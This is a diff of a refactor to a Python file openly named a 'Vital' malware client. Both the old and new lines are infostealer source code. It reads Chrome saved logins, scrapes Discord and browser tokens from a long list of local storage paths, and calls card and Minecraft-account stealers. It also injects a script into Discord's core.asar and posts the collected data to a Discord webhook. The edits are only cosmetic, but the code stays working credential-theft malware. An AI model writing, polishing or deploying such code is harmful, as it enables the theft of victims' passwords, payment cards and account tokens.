@@ -1,39 +1,28 @@
 # 'Vital' malware client
-# Current line count:
+# Current line count: 263
 
 # Originally created by github.com/rpie
 # Changes I made: Organized project a tiny bit more, also changed some global names
 # and decided to clarify some comments, fixed some bad code.
 
-import ctypes
-import os
-import subprocess
-import re
-import requests
-import sys
-import sqlite3
-import win32crypt
-import shutil
-import json
-import random
-import PyChromeDevTools
-
+# Some refactoring by Astro Orbis
+import ctypes, os, subprocess, re, requests, sys, sqlite3, win32crypt, shutil, json, random, PyChromeDevTools, urllib
 from colorama import Fore
 from string import ascii_uppercase
 
 
-""" Global variables """
+# Global variables
 
 WEBHOOK 	= 	'' 									# Discord webhook URL
 REDIRECT 	= 	'' 									# Optional redirect to website
 HOST	 	= 	'' 									# Server host URL (e.g: http://127.0.0.1/)
-CHROME_DATA 	=	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
-USERNAME	=	os.environ.get('USERNAME')						# Username environment variable
-APPDATA		=	os.getenv('APPDATA')							# Appdata environment variable
+CHROME_DATA =	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
+USERNAME	=	os.environ.get('USERNAME')			# Username environment variable
+APPDATA		=	os.getenv('APPDATA')				# Appdata environment variable
 
-DEBUG 		= 	False									# Enable or disable debugging
+DEBUG 		= 	False								# Enable or disable debugging
 
-""" Classes """
+# Classes
 
 class Sender:
 	def __init__(self, url):
@@ -41,7 +30,7 @@ class Sender:
 		self.req 	= 	urllib.request.Request(self.url)
 		
 		self.agent 	=	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
-		self.content	=	"application/json; charset=utf-8"
+		self.content=	"application/json; charset=utf-8"
 		
 	def send(self, data):
 		jsondata = json.dumps(data)
@@ -133,7 +122,7 @@ class PasswordStealer:
 		return self.stolen
 		
 
-""" Functions """
+# Functions
 
 def getLocations():
     if os.name == 'nt':
@@ -177,9 +166,7 @@ def RunCMD(command, wait = False):
 def inject(location):
     script = open('injection.js', 'r').read()
     f = open(str(location), 'w')
-    f.write(f'''module.exports = require('./core.asar');
-{script}
-''')
+    f.write(f"module.exports = require('./core.asar');\n{script}")
     f.close()
 
 def findEnd(userName):
@@ -202,7 +189,7 @@ def findEnd(userName):
 
 def ScrapeTokens(roaming):
     tokens = []
-    crawl = {
+    Crawl_Locations = {
         'Discord': '\\discord\\Local Storage\\leveldb\\',
         'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
         'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
@@ -227,7 +214,7 @@ def ScrapeTokens(roaming):
         'Iridium': roaming + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
     }
 
-    for source, path in crawl.items():
+    for source, path in Crawl_Locations.items():
         if not os.path.exists(path):
             continue
         for file_name in os.listdir(path):
@@ -245,9 +232,7 @@ def ScrapeTokens(roaming):
     return tokens
 
 def replacePage():
-    if REDIRECT:
-    	chrome = PyChromeDevTools.ChromeInterface(port=9223)
-    	chrome.Page.navigate(url=str(REDIRECT))
+    if REDIRECT: PyChromeDevTools.ChromeInterface(port=9223).Page.navigate(url=str(REDIRECT))
 
 def main():
     stolen_cards = CardStealer().steal()
@@ -264,11 +249,13 @@ def main():
     findEnd(USERNAME)
     replacePage()
 
-    DATA = f'User: {os.environ.get('username')}\nTokens: ```json\n{ScrapeTokens(APPDATA)}\n```\n' \
-	    + f'Minecraft Accounts: ```json\n{MinecraftStealer()}\n```'
+    DATA = f"User: {os.environ.get('username')}\nTokens: ```json\n{ScrapeTokens(APPDATA)}\n```\n" + f'Minecraft Accounts: ```json\n{MinecraftStealer()}\n```'
 
-    requests.post(url=WEBHOOK,
-        data = { 'content': DATA }
+    requests.post(
+        url  = WEBHOOK,
+        data = { 
+            'content': DATA 
+        }
     )
     
 if __name__ == '__main__':
